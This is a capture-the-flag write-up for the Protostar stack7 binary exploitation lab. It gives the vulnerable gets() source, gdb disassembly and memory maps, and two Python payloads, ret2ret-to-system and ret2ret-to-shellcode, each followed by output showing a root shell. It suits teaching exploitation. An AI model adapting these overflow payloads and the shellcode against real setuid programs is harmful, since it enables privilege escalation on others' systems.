
# Stack 7


```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}

```

The code looks a lot to stack6 but there are small differences : 
   - the return address cannot be an address from the stack or from the libc

Since there isn't any kind of protection or mitigation we can basically execute our 
shellcode or do a ret2libc attack with a simple ret2ret.

The idea is to overwrite the buffer and overwrite the save eip with the address of the ret instruction.
A ret instruction is simply a "pop eip" which mean putting the element on the top of the stack in eip.


So once we overwrite eip with the address of ret instruction, the next 4 bytes can this time be from the stack or the libc
(address starting with 0xb...).


To find how many bytes we need before  overwriting eip we can basically look the assembly instruction with gdb.

```
0x080484c4 <getpath+0>:	push   ebp
0x080484c5 <getpath+1>:	mov    ebp,esp
0x080484c7 <getpath+3>:	sub    esp,0x68
0x080484ca <getpath+6>:	mov    eax,0x8048620
0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]     <---  the 'buffer' start at ebp-0x4
0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax 
0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>    
0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:	and    eax,0xb0000000
0x080484fd <getpath+57>:	cmp    eax,0xb0000000
0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:	mov    eax,0x8048634
0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:	mov    eax,0x8048640
0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:	leave  
0x08048544 <getpath+128>:	ret   

```

'buffer' start at ebp-0x4c  which mean we need to overwrite 0x4c + 0x4 to overwrite ebp.
So we need to overwrite 80 bytes (0x4c+4 =80).


# ret2libc with ret2ret

In the stack6 challenge we have already explain how ret2libc work, so i'm not going to
explain it again.



find the start address of the libc:


```
(gdb) run
(gdb) info proc map
process 2189
cmdline = '/opt/protostar/bin/stack7'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so <-----------
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]

```
The start of the libc at runtime : 0xb7e97000

Address of system: 

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>

```
offset of the string '/bin/sh' in the libc: 

```
user@protostar:~$ strings -t x /lib/libc-2.11.2.so | grep /bin/sh
 11f3bf /bin/sh

```
Address of exit: 
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

```

recap :

We are going to overwrite the save eip with the address of the ret instrctuction in getpath (getpath+128)
, so once getpath will ret  we will execute once more the ret instruction. 
So the instruction pointer will now point on the next 4 bytes on the stack, which we plan to be the address of system
and then it is a simple ret2libc.

Thanks to that technique we manage to bypass the control on the address.



## payload : 

```python
import struct 

padding = b'A'*80 

ret_addres = struct.pack('<I', 0x08048544) # address of the ret instruction in getpath
system_ret=struct.pack('<I', 0xb7ecffb0) # address of system in the libc
exit_addr= struct.pack('<I',0xb7ec60c0) # address of exit in libc

libc_base_add = 0xb7e97000 # start of the libc
binsh_offset=  0x11f3bf # offset of the string /bin/sh

binsh_addr= struct.pack('<I',0xb7e97000+0x11f3bf)

payload = padding + ret_addres + system_ret  + exit_addr  + binsh_addr

print(payload)

```

We got our shell(root) : 

```
user@protostar:~$ (python stack7_ret2lib.py ;cat ) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD����`췿c��
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root


```



# execute shellcode with ret2ret




## payload


```python
import struct 


nop_sled=b'\x90'*40
shellcode = b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80'

padding = b'A'*80

ret_addres = struct.pack('<I', 0x08048544) # address of the ret instruction in getpath
ret_addres_two=struct.pack('<I', 0xbffff7d0) # address on the stack (in the middle of the nop sled)



payload = padding + ret_addres + ret_addres_two + nop_sled + shellcode

print(payload)


```


We got our shell with root privileges :

```
user@protostar:~$ (python exploit.py; cat) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD��������������������������������������������1�1�1�1Ұ
                                                                                                                                                              Rhn/shh//bi��̀
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root



```


shellcode source : [shellcode](https://github.com/jjeyanthan/shellcoding/blob/main/shell_without_priv_x86/shell.hex)